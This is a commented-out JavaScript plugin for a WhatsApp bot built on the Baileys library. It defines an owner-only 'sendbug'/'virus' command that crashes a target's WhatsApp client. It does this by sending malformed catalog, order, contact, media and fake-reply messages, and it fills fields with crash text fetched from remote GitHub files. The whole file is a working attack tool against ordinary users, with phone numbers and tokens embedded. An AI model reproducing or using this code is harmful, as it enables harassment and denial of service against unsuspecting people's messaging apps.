/* Thanks To AyGemuy For This Feature */

/*
import fs from 'fs'
import fetch from 'node-fetch'
import { sticker } from '../lib/sticker.js'
const { default: makeWASocket, BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, downloadContentFromMessage, downloadHistory, proto, getMessage, generateWAMessageContent, prepareWAMessageMedia } = (await import('@adiwajshing/baileys')).default
let handler  = async (m, { conn, args, text, command, usedPrefix: _p, participants }) => {
if (!text) return m.reply(`Ejemplo de uso: *${_p + command}* <tipo> <numero>\n\n*Nota:*\nNo haga mal uso de este comando!`)
let thumb = fs.readFileSync('./Menu2.jpg')
let virus = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v12.txt")).text()
let virus2 = await (await fetch("https://raw.githubusercontent.com/Nevt12/basedb/main/v26.txt")).text()
let type = (args[0] || '').toLowerCase()
const from = m.key.remoteJid

let q = `Bug Tag From ${global.author}\n${text}`
let sections = [{
title: `Created by ${global.author}`,
rows: [
{ title: 'Bug PDF', rowId: `${_p + command} pdf ${text}` },
{ title: 'Bug VN', rowId: `${_p + command} vn ${text}` },
{ title: 'Bug Sticker', rowId: `${_p + command} sticker ${text}` },
{ title: 'Bug Image', rowId: `${_p + command} bugimg ${text}` },
{ title: 'Bug Video', rowId: `${_p + command} bugvid ${text}` },
{ title: 'Bug Crash', rowId: `${_p + command} bugcrash ${text}` },
{ title: 'Bug Kontak', rowId: `${_p + command} bugkontak ${text}` },
{ title: 'Bug ReactPc', rowId: `${_p + command} reactpc ${text}` },		
{ title: 'Bug Catalog', rowId: `${_p + command} bugcatalog ${text}` },
{ title: 'Bug TextCrash', rowId: `${_p + command} bugtextcrash ${text}` },
]}]
let listMessage = {
text: '*[ List Bug ]*\n\n*Note :* Jangan Asal Kirim ke orang yg tidak bersalah',
footer: global.author,
buttonText: 'Silahkan Klik Di Sini',
sections
}

const kal = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "@s.whatsapp.net" } : {}) }, "message": { "extendedTextMessage": { "text": `${packname}`, "previewType": "NONE", "contextInfo": { "stanzaId": "3EB0382EDBB2", "participant": "@s.whatsapp.net" }}}}

const trol = { key: { fromMe: false, fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "orderMessage": { "orderId": "594071395007984", "thumbnail": fs.readFileSync('./Menu2.jpg'), "itemCount": fsizedoc, "status": "INQUIRY", "surface": "CATALOG", "message": "", "orderTitle": `${packname}`, "sellerJid": "6285736178354@s.whatsapp.net", "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", "totalAmount1000": fsizedoc, "totalCurrencyCode": "IDR" }}}

const ftrolii = { key: { fromMe: false, "participant":"0@s.whatsapp.net", "remoteJid": "@g.us"}, "message": { orderMessage: { itemCount: fsizedoc, status: 200, thumbnail: thumb, surface: 200, message: `© ${packname}`, token: "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", totalAmount1000: fsizedoc, totalCurrencyCode: "IDR", orderTitle: `${packname} ${virus2}`, sellerJid: '0@s.whatsapp.net'}}, contextInfo: { "forwardingScore":999,"isForwarded":true }, sendEphemeral: true }	

const bugstik = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "orderMessage": { "orderId": "594071395007984", "thumbnail": fs.readFileSync('./Menu2.jpg'), "itemCount": fsizedoc, "status": "INQUIRY", "surface": "CATALOG", "message": `${packname}`, "orderTitle": `${packname}`, "sellerJid": "6285736178354@s.whatsapp.net", "token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==", "totalAmount1000": fsizedoc, "totalCurrencyCode": "IDR" }}}

const bugpdf = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, message: { "imageMessage": { "mimetype": "image/jpeg", "caption": `${packname}`, "jpegThumbnail": thumb }}}

const adehvn = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "locationMessage": {} }} 

const bugimage = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...({ remoteJid: "" }) }, "message": { "audioMessage": { "url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc", "mimetype": "audio/aac", "fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=", "fileLength": fsizedoc, "seconds": fsizedoc, "caption": `${packname}`, "ptt": false, "mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=", "fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=", "directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB", "mediaKeyTimestamp": "1632753911" }}}

const messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Menu2.jpg') }, { upload: conn.waUploadToServer })
const catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({ "productMessage": { "product": { "productImage": messa.imageMessage, "productId": "4383282311765462", "title": `${packname}`, "description": `${virus2}`, "currencyCode": "IDR", "bodyText": `${virus}`, "footerText": `${packname}`, "priceAmount1000": fsizedoc, "productImageCount": 1, "firstImageId": 1, "salePriceAmount1000": fsizedoc, "retailerId": `${packname}`, "url": "wa.me/62881037044211" }, "businessOwnerJid": "62881037044211@s.whatsapp.net", }}), { userJid: m.chat, quoted: ftrolii })	

const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `${packname}${virus}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:${packname}\nitem1.TEL;waid=6281991410940:6281991410940\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}  

const main = { "key": { "fromMe": false, "participant": "0@s.whatsapp.net", ...({"remoteJid":''})}, "message":{ "imageMessage":{ "mimetype":"image/jpeg", "jpegThumbnail": fs.readFileSync('./Menu2.jpg')}}}


switch (type) {
    
case 'vn': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {audio: thumb, mimetype: 'audio/mpeg', ptt:true }, {quoted: adehvn})}
break
    
case 'pdf': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {document: thumb, filename:`🌞𖧹͓͜͜͡𝑴͜͡𝑨͜͡҉𝑴͜͡𝑨͜͡҉𝑪͜͡𝑶͜͡𖧹͓͓󠇞𞥊.pdf`, mimetype: 'application/pdf',}, {quoted: bugpdf})}
break

case 'sticker': {
let stiker = await sticker(null, 'https://telegra.ph/file/e2d2fac4853f1f923b35c.jpg', global.packname, global.author)
conn.sendFile(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', stiker, 'sticker.webp', '', false, { asSticker: true }, {quoted: bugstik})}
break

case 'bugimg': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {image: thumb, bugimage }, {quoted: bugimage})}
break
    
case 'bugcrash': {
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '622150996855@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '15517868074@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@broadcast')
conn.fakeReply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', 'A', '447710173736@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')}
break
    
case 'bugkontak': {
let res = await generateWAMessageFromContent(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', { "contactMessage": { "vcard": "HAHaAhHAHAHA", "displayName": `${author}`, "contextInfo": { "forwardingScore": 3, "isForwarded": true }}}, {quoted: fkontaak, contextInfo:{}}) 
conn.relayWAMessage(res)}
break
    
case 'reactpc': {
await conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {text: `${packname}` }, {quoted: trol})}
break
    
case 'bugtag': {
if (!m.isGroup) return global.dfail('group',m,conn)
conn.sendMessage(m.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: kal })}
break
    
case 'bugcatalog': {
conn.relayMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', catalog.message, { messageId: catalog.key.id })}
break
    
case 'bugtextcrash': {
conn.reply(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', `${packname}`, main)}
break
    
case 'bugvid': {
conn.sendMessage(text.replace(/[^0-9]/g, '') + '@s.whatsapp.net', {video: thumb, bugimage, }, {quoted: bugimage})}
break
    
default:
if (!/[01]/.test(command)) return conn.sendMessage(m.chat, listMessage, m)
throw false
}
m.reply(`Enviado el Virus ${type} Al numero ${text}`)
}
handler.command = /^((send)?(bug?|virtex|virus))$/i
handler.rowner = true
export default handler
global.fsizedoc = '99999999999999' 

*/
